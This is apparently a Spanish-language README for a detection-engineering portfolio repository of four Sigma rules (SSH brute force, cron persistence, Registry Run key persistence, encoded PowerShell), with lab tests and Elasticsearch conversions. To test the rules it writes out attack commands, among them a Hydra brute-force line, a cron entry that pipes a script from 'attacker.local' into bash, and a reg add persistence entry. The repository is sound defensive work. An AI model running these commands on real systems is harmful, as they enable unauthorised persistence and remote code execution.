# Sigma Detection Rules

Reglas de detección en formato [Sigma](https://github.com/SigmaHQ/sigma) para 4 técnicas comunes de
MITRE ATT&CK, cubriendo entornos Linux y Windows. Cada regla incluye su justificación técnica, un
lab reproducible donde la probé, capturas del ataque y del log resultante, y su conversión a una
query real de Elasticsearch.

El objetivo del repositorio es mostrar el ciclo completo de **detection engineering**: identificar
una técnica, entender qué rastro deja en los logs, escribir la regla, validarla contra un ataque
real en un entorno controlado y prepararla para desplegar en un SIEM.

## ¿Qué es Sigma y por qué usarlo?

Sigma es un formato genérico en YAML para escribir reglas de detección una vez y traducirlas
automáticamente al lenguaje de consulta del SIEM que se use (Splunk SPL, Elastic Lucene/EQL,
QRadar AQL, Microsoft Sentinel KQL, etc.). Es el estándar de facto para compartir lógica de
detección entre equipos y herramientas.

## Estructura del repositorio

```
sigma-detection-rules/
├── rules/                 # Reglas Sigma (.yml)
├── sample-logs/           # Logs de ejemplo que disparan cada regla
├── converted-elastic/     # Reglas convertidas a Lucene, listas para Kibana
├── images/                # Capturas del lab de pruebas
├── LICENSE
└── README.md
```

## Reglas incluidas

| # | Regla | Técnica MITRE ATT&CK | Plataforma | Severidad |
|---|---|---|---|---|
| 1 | Fuerza bruta SSH | [T1110](https://attack.mitre.org/techniques/T1110/) | Linux | Medium / High con correlación |
| 2 | Persistencia vía cron | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | Linux | Medium |
| 3 | Persistencia vía Registry Run Key | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Windows | Medium |
| 4 | PowerShell con comando codificado | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Windows | High |

## El lab de pruebas

Para validar cada regla monté un entorno reproducible con dos VMs en VirtualBox:

- **Ubuntu Server 22.04** — para las reglas de Linux. Servicios usados: `sshd`, `auditd`.
- **Windows 10** con **Sysmon** instalado — para las reglas de Windows.

Cada regla se probó ejecutando el ataque real, capturando el log generado y comprobando que la
lógica de la regla lo detecta correctamente. Las capturas de cada prueba están en la sección
correspondiente de este README.

---

## Regla 1: Fuerza bruta SSH

- **Técnica MITRE ATT&CK:** [T1110 - Brute Force](https://attack.mitre.org/techniques/T1110/)
- **Plataforma:** Linux
- **Regla:** [`rules/linux_ssh_bruteforce.yml`](rules/linux_ssh_bruteforce.yml)

### Qué detecta

Intentos repetidos de autenticación SSH fallida desde el mismo origen en un periodo corto. Es
el patrón característico de un ataque automatizado con herramientas como `hydra`, `medusa` o
`patator`. Un fallo aislado es error de usuario; una ráfaga concentrada es un ataque.

La regla tiene dos partes:

1. **Base:** cada línea de `auth.log` que contiene `Failed password`.
2. **Correlación:** cuando la misma `source.ip` acumula ≥5 eventos en 5 minutos, se eleva a `high`.

### Cómo la probé

Ataqué mi propia VM Ubuntu con Hydra usando un diccionario pequeño de 7 contraseñas contra un
usuario `victima` creado al efecto:

```bash
hydra -l victima -P /tmp/passwords.txt ssh://127.0.0.1
```

![Ataque con Hydra](images/01-ssh-hydra-attack.png)

Cada intento fallido queda registrado en `/var/log/auth.log`:

![Log auth.log](images/01-ssh-auth-log.png)

El patrón `Failed password for <usuario> from <ip>` es exactamente lo que busca la regla base
(`message|contains: 'Failed password'`).

Para simular la parte de correlación, extraje y conté las IPs de origen:

```bash
sudo grep 'Failed password' /var/log/auth.log \
  | awk '{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' \
  | sort | uniq -c | sort -rn
```

![Conteo de intentos por IP](images/01-ssh-ip-count.png)

En Kibana Security esta parte se implementaría como una **Threshold Rule**, ya que las reglas de
correlación de Sigma no son convertibles directamente a Lucene (requieren estado y ventana
temporal).

### Limitaciones

- La regla solo mira `Failed password`, no `Invalid user` (intentos con cuentas inexistentes).
- El agrupamiento por `source.ip` no cubre ataques distribuidos desde botnet.
- Un ataque muy lento (1 intento por hora) pasaría bajo el umbral.

---

## Regla 2: Persistencia vía cron

- **Técnica MITRE ATT&CK:** [T1053.003 - Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
- **Plataforma:** Linux
- **Regla:** [`rules/linux_cron_persistence.yml`](rules/linux_cron_persistence.yml)

### Qué detecta

Creación o modificación de tareas cron por cualquiera de las dos vías principales:

- Uso del comando `crontab -e` para editar el crontab del usuario.
- Escritura directa en archivos del sistema: `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`.

Cron es una de las técnicas de persistencia más antiguas y usadas en Linux: cualquier comando
programado ahí se ejecutará periódicamente sin intervención del atacante, incluso tras un
reinicio.

### Cómo la probé

*[CAPTURA PENDIENTE: ejecución del ataque]*

Simulé la persistencia añadiendo una tarea cron que se ejecuta cada minuto:

```bash
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://attacker.local/payload.sh | bash") | crontab -
```

*[CAPTURA PENDIENTE: log de auditd mostrando la escritura en /var/spool/cron/]*

Para tener visibilidad de las escrituras a archivos, configuré `auditd` con reglas de watch:

```bash
sudo auditctl -w /etc/crontab -p wa -k cron_change
sudo auditctl -w /etc/cron.d/ -p wa -k cron_change
sudo auditctl -w /var/spool/cron/ -p wa -k cron_change
```

*[CAPTURA PENDIENTE: eventos de auditd tras el ataque, obtenidos con `ausearch -k cron_change`]*

### Limitaciones

- Requiere `auditd` configurado con reglas de file watch; sin esa visibilidad la regla no
  dispara para el vector de escritura directa.
- Los sistemas de gestión de configuración (Ansible, Puppet) generan falsos positivos.
- No cubre otros mecanismos de tarea programada como `systemd timers` o `at`.

---

## Regla 3: Persistencia vía Registry Run Key

- **Técnica MITRE ATT&CK:** [T1547.001 - Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
- **Plataforma:** Windows
- **Regla:** [`rules/windows_registry_run_key_persistence.yml`](rules/windows_registry_run_key_persistence.yml)

### Qué detecta

Modificación de las claves de registro `Run` y `RunOnce`, que ejecutan automáticamente cualquier
programa referenciado al iniciar sesión el usuario. Es el equivalente Windows de cron y una de
las técnicas de persistencia más veteranas y persistentes en la industria.

Rutas monitorizadas:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- (Y sus equivalentes bajo `HKLM` gracias al uso de `contains`.)

La regla excluye procesos legítimos conocidos (OneDrive, Teams) mediante un filtro `not
filter_known_software`. Esta lista de exclusiones debería ampliarse en un entorno real tras un
periodo de tuning.

### Cómo la probé

*[CAPTURA PENDIENTE: instalación de Sysmon con configuración por defecto]*

Requisito previo: Sysmon instalado con configuración que registre eventos de tipo 13
(`RegistryEvent (Value Set)`). Usé la configuración de referencia de [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config).

Simulé la persistencia con un `reg add` desde una consola sin privilegios:

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilPersistence /d "C:\Users\Public\evil.exe" /f
```

*[CAPTURA PENDIENTE: comando ejecutándose y confirmación]*

*[CAPTURA PENDIENTE: evento 13 de Sysmon en el Visor de Eventos, mostrando TargetObject y Image]*

### Limitaciones

- Depende de Sysmon; sin él Windows no registra eventos de modificación de valores de registro.
- La lista de procesos legítimos es corta (OneDrive, Teams); en producción crecería según el
  entorno y los falsos positivos observados.
- No cubre otras claves de autostart (Winlogon, Services, Scheduled Tasks…).

---

## Regla 4: PowerShell con comando codificado

- **Técnica MITRE ATT&CK:** [T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001/) + [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
- **Plataforma:** Windows
- **Regla:** [`rules/windows_powershell_encoded_command.yml`](rules/windows_powershell_encoded_command.yml)

### Qué detecta

Uso del flag `-EncodedCommand` (o sus abreviaturas `-enc`, `-e`) en PowerShell. Este flag acepta
un script codificado en Base64, técnica ampliamente utilizada por Cobalt Strike, Empire y otros
frameworks de post-explotación para ofuscar el payload y evitar detecciones basadas en cadenas
en texto plano.

La regla contempla las 4 variantes de escritura del flag y usa espacios en los patrones cortos
(`-e `, `' -en '`) para evitar matches accidentales con otros flags como `-ExecutionPolicy`.

### Cómo la probé

*[CAPTURA PENDIENTE: comando codificado en Base64]*

Codifiqué un comando simple en Base64 (UTF-16LE, como espera PowerShell):

```powershell
$cmd = "Write-Host 'PoC encoded command'"
$b = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($b)
powershell.exe -enc $enc
```

*[CAPTURA PENDIENTE: ejecución del comando]*

*[CAPTURA PENDIENTE: evento 1 de Sysmon con el CommandLine completo mostrando `-enc <base64>`]*

### Limitaciones

- Si el atacante concatena strings para construir el flag dinámicamente (por ejemplo con
  `-e`+`nc`), la regla no dispara.
- Algunos usos legítimos existen: SCCM/Intune y ciertos scripts corporativos usan
  `-EncodedCommand` por comodidad con caracteres especiales.
- No decodifica el Base64 ni analiza el payload real. Una regla complementaria en un stack
  maduro decodificaría y buscaría IoCs dentro del comando.

---

## Cómo reproducir las conversiones

1. Instalar `sigma-cli` y el backend de Elasticsearch:
   ```bash
   pip install sigma-cli pysigma-backend-elasticsearch
   ```

2. Convertir una regla a query Lucene:
   ```bash
   # Reglas Windows (con pipeline ECS)
   sigma convert -t lucene -p ecs_windows rules/windows_powershell_encoded_command.yml
   
   # Reglas Linux (campos genéricos, sin pipeline)
   sigma convert -t lucene --without-pipeline rules/linux_cron_persistence.yml
   ```

3. Las queries ya convertidas están en [`converted-elastic/`](converted-elastic/), listas para
   pegar en Kibana → Security → Rules → Custom query.

## Roadmap

- [ ] Añadir regla para exfiltración vía DNS tunneling (T1071.004)
- [ ] Convertir también a formato Splunk SPL para comparar cobertura
- [ ] Añadir GitHub Actions con `sigma check` como validador en cada PR
- [ ] Desplegar el lab con Elastic Stack completo y capturar alertas reales en Kibana

## Autor

Raúl Sineiro Domínguez — Máster en Ciberseguridad, Campus Internacional de Ciberseguridad  
GitHub: [github.com/raulsineiro](https://github.com/raulsineiro)
